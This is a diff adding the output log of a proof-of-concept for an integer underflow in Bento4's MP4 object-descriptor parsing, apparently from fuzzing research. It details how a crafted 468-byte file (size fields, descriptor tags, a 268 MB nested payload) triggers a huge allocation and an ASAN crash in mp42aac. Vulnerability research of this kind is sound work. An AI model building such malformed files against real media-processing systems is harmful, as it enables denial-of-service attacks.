@@ -1,0 +1,20 @@
+=== VULN-003 PoC: AP4_ObjectDescriptor integer underflow ===
+Date: Mon Sep  7 01:12:07 PM +08 2026
+
+[*] Generating vuln_003.mp4 ...
+[+] Written 468 bytes to /data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4Expandable_h/vuln_003.mp4
+[+] iods box size              = 23 bytes
+[+] Descriptor tag             = 0x01 (AP4_DESCRIPTOR_TAG_OD)
+[+] Declared descriptor payload= 2 bytes
+[+] Actual bytes read by ctor  = 4  (id_flags 2B + url_len 1B + url_str 1B)
+[+] Underflow: 2 − 4           = 0xFFFFFFFE  (~4 GB SubStream)
+[+] Attack nested descriptor   = tag=0x07 (default→UnknownDescriptor), payload=0x0FFFFFFF (268 MB)
+[+] Expected: new AP4_Byte[268435455] under mmap_limit_mb=200 → ASAN abort
+
+[*] Running mp42aac (ASAN mmap_limit_mb=200 to force allocation failure) ...
+
+[*] ASAN log output:
+--- /data/ylwang/non-textfuzz/target/_poc/Bento4/Source_C++_Core_Ap4Expandable_h/asan.log.2028491 ---
+(total_mmaped >> 20) < common_flags()->mmap_limit_mb
+[*] Result summary:
+  => CRASH / ASAN ERROR DETECTED (see asan.log above)
